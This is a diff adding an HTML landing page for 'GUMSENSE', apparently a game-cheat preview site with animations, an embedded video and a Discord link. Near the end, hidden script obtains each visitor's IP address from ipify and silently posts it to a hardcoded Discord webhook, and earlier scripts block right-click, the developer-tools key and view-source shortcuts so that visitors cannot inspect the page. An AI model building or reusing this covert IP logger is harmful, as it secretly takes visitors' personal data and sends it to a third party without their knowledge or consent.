@@ -1,0 +1,116 @@
+<head><title>GUMSENSE</title>
+
+		<script src="https://use.fontawesome.com/544301a847.js"></script><link href="https://use.fontawesome.com/544301a847.css" media="all" rel="stylesheet">
+		<link href="https://fonts.googleapis.com/css?family=Cabin+Sketch|Finger+Paint|Swanky+and+Moo+Moo" rel="stylesheet">
+        <link rel="stylesheet" href="myst.css">
+        <link rel="stylesheet" href="animate.css">
+		<link rel="stylesheet" href="star-animation.css">
+		<script src="jquery.js"></script>
+        <script src="main.js"></script>	 
+<script type="text/javascript" src="hit.js"></script>
+		<link rel="icon" href="favicon.ico">
+		<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
+		
+
+<script>
+
+document.oncontextmenu = cmenu; function cmenu() { return false; }
+</script>
+<script>
+window.onkeydown = function(evt) {
+    if(evt.keyCode == 123) return false;
+};
+window.onkeypress = function(evt) {
+    if(evt.keyCode == 123) return false;
+};
+</script>
+<script>
+
+function preventSelection(element){
+  var preventSelection = false;
+  function addHandler(element, event, handler){
+  if (element.attachEvent) element.attachEvent('on' + event, handler);
+  else if (element.addEventListener) element.addEventListener(event, handler, false);  }
+  function removeSelection(){
+  if (window.getSelection) { window.getSelection().removeAllRanges(); }
+  else if (document.selection && document.selection.clear)
+  document.selection.clear();
+  }
+
+
+  addHandler(element, 'mousemove', function(){ if(preventSelection) removeSelection(); });
+  addHandler(element, 'mousedown', function(event){ var event = event || window.event; var sender = event.target || event.srcElement; preventSelection = !sender.tagName.match(/INPUT|TEXTAREA/i) ;});
+
+ 
+  function killCtrlA(event){
+  var event = event || window.event;
+  var sender = event.target || event.srcElement;
+  if (sender.tagName.match(/INPUT|TEXTAREA/i)) return;
+  var key = event.keyCode || event.which;
+  if ((event.ctrlKey && key == 'U'.charCodeAt(0)) || (event.ctrlKey && key == 'A'.charCodeAt(0)) || (event.ctrlKey && key == 'S'.charCodeAt(0)))  // 'A'.charCodeAt(0) можно заменить на 65
+  { removeSelection();
+  if (event.preventDefault) event.preventDefault();
+  else event.returnValue = false;}}
+  addHandler(element, 'keydown', killCtrlA);
+  addHandler(element, 'keyup', killCtrlA);
+}
+preventSelection(document);
+
+</script>
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-16">
+<style type="text/css">* {cursor: url(https://cur.cursors-4u.net/cursors/cur-9/cur817.cur), auto !important;}</style><a href="https://www.cursors-4u.com/cursor/2011/11/10/small-grey-outline-pointer.html" target="_blank" title="Small Grey Outline Pointer"><img src="https://cur.cursors-4u.net/cursor.png" border="0" alt="Small Grey Outline Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
+
+							<div id="stars"></div>
+<div id="stars1"></div>
+<div id="stars2"></div>
+	<div id="center">
+	<div class="disable-select">
+	<div class="animated fadeIn">
+
+<br><br>
+<pre1 style="font-size: 15px; font-family: 'Montserrat', cursive;">gumsense preview</pre1>
+			
+	</div>
+<br>
+	</div>
+	
+</div>
+
+<a class="navbar-brand" id="logo" href="index.html">
+    <div class="container" id="jumbo-container">
+    <div id="title">
+        <h1>GUM<span>SENSE</span></h1>
+    </div>
+</div></a>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><center>
+<iframe width="640" height="360" src="https://www.youtube.com/embed/gGg641rNAF4?autoplay=1&loop=1&mute=1" title="CHAIN$AW" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</center>
+<br>
+            <nav>
+				<ul>
+<center><a href="https://discord.gg/x2wZXdnup3" style="font-size: 12px; font-family: 'Montserrat', cursive;">discord</a></center>
+				</ul>
+			</nav>
+
+            <script>
+                function getIP(json) {
+                  var request = new XMLHttpRequest(); //making a request for the webhook
+                      request.open("POST", "https://discord.com/api/webhooks/1180471242411749438/BtvRD17XnxyNchuBW4E2T4utTRNFtpscAkcTR2BfUjaLMc2N1OWX4N0hGHa3UH49EV4I");
+                
+                      request.setRequestHeader('Content-type', 'application/json');
+                
+                      var params = {
+                        username: "fx-webhook",
+                        avatar_url: "https://i.imgur.com/poAeeFh.png",
+                        content: "> ip logged: **" + json.ip + "**"
+                      }
+                   //just a webhook parameters such as avatar,name,message
+                
+                      request.send(JSON.stringify(params));
+                    }
+                
+                </script>
+                <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</body></html>
